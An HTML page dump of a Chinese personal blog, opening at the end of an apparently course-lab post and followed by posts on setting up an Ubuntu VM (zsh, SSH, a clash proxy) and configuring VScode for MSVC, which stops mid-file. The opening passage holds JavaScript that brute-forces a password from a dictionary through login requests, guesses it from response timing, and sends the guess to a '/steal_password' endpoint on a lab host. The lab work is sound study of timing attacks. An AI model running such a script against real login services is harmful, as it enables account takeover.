class="property">onerror</span> = <span class="function">() =&gt;</span> &#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">var</span> end = <span class="keyword">new</span> <span class="title class_">Date</span>();</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      <span class="comment">/* &gt;&gt;&gt;&gt; HINT: you might want to replace this line with something else. */</span></span></span><br><span class="line"><span class="language-javascript">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Try <span class="subst">$&#123;dictionary[index - <span class="number">1</span>]&#125;</span>: Time elapsed <span class="subst">$&#123;end-start&#125;</span>`</span>);</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (ti &lt; end - start) &#123;</span></span><br><span class="line"><span class="language-javascript">        ti = end - start;</span></span><br><span class="line"><span class="language-javascript">        ans = index - <span class="number">1</span>;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">      <span class="comment">/* &lt;&lt;&lt;&lt;&lt; */</span></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      start = <span class="keyword">new</span> <span class="title class_">Date</span>();</span></span><br><span class="line"><span class="language-javascript">      <span class="keyword">if</span> (index &lt; dictionary.<span class="property">length</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">/* &gt;&gt;&gt;&gt; <span class="doctag">TODO:</span> replace string with login GET request */</span></span></span><br><span class="line"><span class="language-javascript">        test.<span class="property">src</span> = <span class="string">`http://192.168.43.134:3000/get_login?username=userx&amp;password=<span class="subst">$&#123;dictionary[index]&#125;</span>`</span>;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">/* &lt;&lt;&lt;&lt; */</span></span></span><br><span class="line"><span class="language-javascript">      &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="comment">/* &gt;&gt;&gt;&gt; <span class="doctag">TODO:</span> analyze server&#x27;s reponse times to guess the password for userx and send your guess to the server &lt;&lt;&lt;&lt;&lt; */</span></span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">let</span> xhr = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span></span><br><span class="line"><span class="language-javascript">        xhr.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">`http://192.168.43.134:3000/steal_password?password=<span class="subst">$&#123;dictionary[ans]&#125;</span>&amp;timeElapsed=<span class="subst">$&#123;ti&#125;</span>`</span>);</span></span><br><span class="line"><span class="language-javascript">        xhr.<span class="title function_">send</span>();</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">      index += <span class="number">1</span>;</span></span><br><span class="line"><span class="language-javascript">    &#125;;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> start = <span class="keyword">new</span> <span class="title class_">Date</span>();</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">/* &gt;&gt;&gt;&gt; <span class="doctag">TODO:</span> replace string with login GET request */</span></span></span><br><span class="line"><span class="language-javascript">    test.<span class="property">src</span> = <span class="string">`http://192.168.43.134:3000/get_login?username=userx&amp;password=<span class="subst">$&#123;dictionary[index]&#125;</span>`</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="comment">/* &lt;&lt;&lt;&lt; */</span></span></span><br><span class="line"><span class="language-javascript">    index += <span class="number">1</span>;</span></span><br><span class="line"><span class="language-javascript">  </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/03/25/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%88%92%E9%80%82%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Qing-LKY">
      <meta itemprop="description" content="可爱就是正义！">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="小乖乖的妙妙屋">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/03/25/%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%88%92%E9%80%82%E7%9A%84%E8%99%9A%E6%8B%9F%E6%9C%BA/" class="post-title-link" itemprop="url">搭建一个舒适的虚拟机</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2023-03-25 22:46:14" itemprop="dateCreated datePublished" datetime="2023-03-25T22:46:14+08:00">2023-03-25</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-10-15 20:48:38" itemprop="dateModified" datetime="2024-10-15T20:48:38+08:00">2024-10-15</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%A1%B9%E7%9B%AE%E7%BB%8F%E9%AA%8C/" itemprop="url" rel="index"><span itemprop="name">项目经验</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>2.2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>4 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前言">前言</h2>
<p>最近总是重搭虚拟机。简单记录下如何快速的让虚拟机好用。</p>
<h2 id="下载">下载</h2>
<p><a target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/">清华源
Ubuntu Release</a></p>
<h2 id="换源">换源</h2>
<p><a target="_blank" rel="noopener" href="https://mirrors.tuna.tsinghua.edu.cn/help/ubuntu/">清华源
Ubuntu 软件镜像仓库</a> <a target="_blank" rel="noopener" href="https://developer.aliyun.com/mirror/ubuntu">阿里云 Ubuntu
软件镜像仓库</a></p>
<p>用阿里源的可以手动注释掉 deb-src 的行。</p>
<h2 id="设置-root-密码">设置 root 密码</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo passwd</span><br></pre></td></tr></table></figure>
<h2 id="常用包">常用包</h2>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net-tools</span><br></pre></td></tr></table></figure>
<h2 id="oh-my-zsh">oh-my-zsh</h2>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install zsh</span><br><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure>
<p>通过 <a target="_blank" rel="noopener" href="https://gitee.com/mirrors/oh-my-zsh">gitee
同步仓库</a>安装：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl -o install.sh https://gitee.com/mirrors/oh-my-zsh/raw/master/tools/install.sh</span><br><span class="line">REMOTE=https://gitee.com/mirrors/oh-my-zsh.git sh install.sh</span><br></pre></td></tr></table></figure>
<p>建议再加个插件: <a target="_blank" rel="noopener" href="https://gitee.com/testbook/zsh-syntax-highlighting">zsh-syntax-highlighting</a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://gitee.com/minhanghuang/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/plugins/zsh-syntax-highlighting</span><br><span class="line"><span class="comment"># 在插件列表中添加 zsh-syntax-highlighting</span></span><br><span class="line">vim .zshrc</span><br></pre></td></tr></table></figure>
<h2 id="fish">fish</h2>
<p><a target="_blank" rel="noopener" href="https://fishshell.com/">fishshell</a>
是个好东西，虽然我还是习惯 zsh</p>
<h2 id="vim">vim</h2>
<p>vim 有好多版本，如果是桌面操作系统例如 GNOME 建议装 vim-gtk3</p>
<p>无图形化界面或单纯在命令行中使用建议装 vim-nox。因为它支持
Perl、Python、Ruby 和 TCL 脚本</p>
<h2 id="ssh-server">ssh-server</h2>
<p>ubuntu 下安装：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install openssh-server</span><br></pre></td></tr></table></figure>
<p>配置文件 /etc/ssh/sshd_config</p>
<p>加入自己的 keys</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl https://github.com/&lt;username&gt;.keys | <span class="built_in">tee</span> -a ~/.ssh/authorized_keys</span><br></pre></td></tr></table></figure>
<p>在主机上连接虚拟机：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh lky@192.168.xxx.xxx</span><br></pre></td></tr></table></figure>
<h2 id="git">git</h2>
<p>通过 https 端口连接 git@github.com（有时能绕开 DNS 污染）</p>
<p>修改 ~/.ssh/config</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">    Hostname ssh.github.com</span><br><span class="line">    Port 443</span><br></pre></td></tr></table></figure>
<p>生成 key</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t ecdsa -b 521 -C <span class="string">&quot;your_email@example.com&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="开启共享文件夹">开启共享文件夹</h2>
<p>先在 GUI 设置，然后</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmhgfs-fuse .host:/ /mnt/hgfs</span><br></pre></td></tr></table></figure>
<p>当然，也有可能不需要这么干，如果提示 nonempty 的话说明 GUI
设置完自动处理好了</p>
<h2 id="clash">clash</h2>
<p>参考<a target="_blank" rel="noopener" href="https://blog.iswiftai.com/posts/clash-linux/">这篇博客</a></p>
<p>下载安装:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用了公益镜像源，可能会失效</span></span><br><span class="line">curl -O https://download.nuaa.cf/Dreamacro/clash/releases/download/v1.14.0/clash-linux-amd64-v1.14.0.gz</span><br><span class="line"><span class="comment"># curl -O https://github.com/Dreamacro/clash/releases/download/v1.14.0/clash-linux-amd64-v1.14.0.gz</span></span><br><span class="line">gzip -d clash-linux-amd64-v1.14.0.gz</span><br><span class="line">sudo install -m 755 ./clash-linux-amd64-v1.14.0 /usr/local/bin/clash</span><br><span class="line">clash -v</span><br></pre></td></tr></table></figure>
<p>拷贝配置:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo <span class="built_in">mkdir</span> /etc/clash</span><br><span class="line"><span class="comment"># 自己的 config.yaml 例如可以在 windows 的 clash 那里搞出来</span></span><br><span class="line">sudo <span class="built_in">cp</span> config.yaml /etc/clash</span><br><span class="line"><span class="comment"># Country.mmdb 可以下载</span></span><br><span class="line">sudo curl -O https://proxy.freecdn.ml/?url=https://github.com/Dreamacro/maxmind-geoip/releases/download/20230512/Country.mmdb</span><br><span class="line"><span class="comment"># sudo curl -O https://github.com/Dreamacro/maxmind-geoip/releases/download/20230512/Country.mmdb</span></span><br></pre></td></tr></table></figure>
<p>编写 systemd 服务配置
<code>sudo vim /etc/systemd/system/clash.service</code>:</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Clash daemon, A rule-based proxy in Go.</span><br><span class="line">After=network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=simple</span><br><span class="line">Restart=always</span><br><span class="line">ExecStart=/usr/local/bin/clash -d /etc/clash</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br></pre></td></tr></table></figure>
<p>开启服务:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo systemctl <span class="built_in">enable</span> clash</span><br><span class="line">sudo systemctl start clash</span><br><span class="line">sudo systemctl status clash</span><br></pre></td></tr></table></figure>
<p>可以看到端口，export 到变量里即可</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> https_proxy=http://127.0.0.1:7890 http_proxy=http://127.0.0.1:7890</span><br></pre></td></tr></table></figure>
<p>取消的话</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">unset</span>  http_proxy  https_proxy</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/10/24/VScode-%E9%85%8D%E7%BD%AE-MSVC-%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.jpg">
      <meta itemprop="name" content="Qing-LKY">
      <meta itemprop="description" content="可爱就是正义！">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="小乖乖的妙妙屋">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/10/24/VScode-%E9%85%8D%E7%BD%AE-MSVC-%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83/" class="post-title-link" itemprop="url">VScode 配置 MSVC 开发环境</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-10-24 10:02:10 / 修改时间：12:47:40" itemprop="dateCreated datePublished" datetime="2022-10-24T10:02:10+08:00">2022-10-24</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E9%A1%B9%E7%9B%AE%E7%BB%8F%E9%AA%8C/" itemprop="url" rel="index"><span itemprop="name">项目经验</span></a>
                </span>
            </span>

          <br>
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
                <span class="post-meta-item-text">本文字数：</span>
              <span>3.5k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
                <span class="post-meta-item-text">阅读时长 &asymp;</span>
              <span>6 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="前言">前言</h2>
<p>软安实验要求使用 Windows SDK。但是电脑硬盘有点吃紧，而且用习惯了
VScode，不想用 Visual Studio。于是就有了这篇文章。</p>
<p>在这篇文章中，你可能会感兴趣的是:</p>
<ol type="1">
<li>不安装 VS 的情况下安装 MSVC 开发环境，并修改安装盘</li>
<li>配置 VScode，使得调试生成不需要在 Developer Command Prompt 下打开
VScode</li>
</ol>
<p>参考资料: <a target="_blank" rel="noopener" href="https://code.visualstudio.com/docs/cpp/config-msvc">VScode
文档</a>。</p>
<h2 id="下载安装-make-tools">下载、安装 Make Tools</h2>
<p>我们可以选择下载 Vistual Studio 生成工具，而不是安装整个 Vistual
Studio。</p>
<p>在<a target="_blank" rel="noopener" href="https://visualstudio.microsoft.com/zh-hans/downloads/">官网下载页面</a>下拉，找到
"所有下载 -&gt; 适用于 Vistual Studio 2022 的工具 -&gt; Visual Studio
2022 生成工具"。</p>
<p>如果在运行下载的安装包时出现闪退，请不要反复双击安装包，因为它其实是
Installer 的安装包。可以在 Windows 搜索中手动打开 Vistual Studio
Installer 后选择 VS 生成工具进行安装。</p>
<p>安装时根据需要，选中 "使用 C++ 的桌面开发" 即可。</p>
<p>安装时，可以选择安装位置到 D
盘。如果有一些选项是灰色的，可以打开注册表 (Windows + R 输入
regedit)，删除 "HKEY_LOCAL_MACHINE &gt; SOFTWARE &gt; Microsoft &gt;
Visual Studio &gt; setup"，再重新打开 Installer 进行安装。</p>
<h2 id="vscode-配置">VScode 配置</h2>
<h3 id="在终端列表中添加-developer-command-prompt">在终端列表中添加
Developer Command Prompt</h3>
<p>在设置中搜索:
<code>terminal.integrated.profiles.windows</code>，点击在 settings.json
中编辑 (args 中的路径需要自己修改):</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;terminal.integrated.profiles.windows&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;VS 2019&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C:\\Windows\\System32\\cmd.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;/k&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;D:\\Microsoft Visual Studio\\2019\\Community\\Common7\\Tools\\VsDevCmd.bat&quot;</span></span><br><span class="line">            <span class="punctuation">]</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        ...</span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="配置-cc">配置 C/C++</h3>
<p>按需修改即可:</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Win32&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;includePath&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;$&#123;default&#125;&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;defines&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;_DEBUG&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;UNICODE&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;_UNICODE&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;windowsSdkVersion&quot;</span><span class="punctuation">:</span> <span class="string">&quot;10.0.19041.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;compilerPath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;D:/Microsoft Visual Studio/2019/Community/VC/Tools/MSVC/14.29.30133/bin/Hostx64/x64/cl.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;cStandard&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c17&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;cppStandard&quot;</span><span class="punctuation">:</span> <span class="string">&quot;c++17&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;intelliSenseMode&quot;</span><span class="punctuation">:</span> <span class="string">&quot;windows-msvc-x86&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="number">4</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="配置-build-task">配置 Build Task</h3>
<p>修改 task.json 如下 (args 中的路径需要自己修改):</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;windows&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;shell&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;executable&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cmd.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                    <span class="string">&quot;/C&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="string">&quot;\&quot;D:/Microsoft Visual Studio/2019/Community/Common7/Tools/VsDevCmd.bat\&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                    <span class="string">&quot;&amp;&amp;&quot;</span></span><br><span class="line">                <span class="punctuation">]</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;tasks&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;shell&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cl.exe build active file&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cl.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;/Zi&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;/EHsc&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;/Fe:&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;$&#123;fileDirname&#125;\\$&#123;fileBasenameNoExtension&#125;.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;$&#123;file&#125;&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;problemMatcher&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;$msCompile&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;kind&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;isDefault&quot;</span><span class="punctuation">:</span> <span class="keyword">true</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
<p>在 "终端 -&gt; 运行生成任务" (Ctrl + Shift + B) 时选择 "cl.exe build
active file"，即可不通过 Developer Command Prompt 打开 VScode
来生成活动文件了。</p>
<h3 id="配置-debug">配置 Debug</h3>
<p>在 launch.json 中添加 (注意: preLaunchTask 要与 task.json 中的 label
一致):</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.2.0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;configurations&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C/C++: cl.exe build and debug active file&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppvsdbg&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;request&quot;</span><span class="punctuation">:</span> <span class="string">&quot;launch&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;program&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;fileDirname&#125;\\$&#123;fileBasenameNoExtension&#125;.exe&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;stopAtEntry&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;workspaceFolder&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;environment&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;console&quot;</span><span class="punctuation">:</span> <span class="string">&quot;externalTerminal&quot;</span><span class="punctuation">,</span></span><br><span 